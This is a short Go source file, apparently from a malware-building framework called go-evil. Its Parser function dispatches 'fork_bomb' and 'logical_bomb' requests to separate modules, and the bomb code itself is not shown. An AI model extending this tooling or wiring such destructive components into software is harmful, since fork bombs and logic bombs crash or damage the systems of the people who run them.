package bombs

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/domains/bombs/fork"
	"github.com/s9rA16Bf4/go-evil/domains/bombs/logical"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"

	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Parser(function string, value string, data_object *json.Json_t) []string {
	call := []string{}

	switch function {
	case "fork_bomb":
		call = fork.Bomb(value, data_object)

	case "logical_bomb":
		call = logical.Bomb(value, data_object)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "bombs.Parser()")

	}

	return call
}
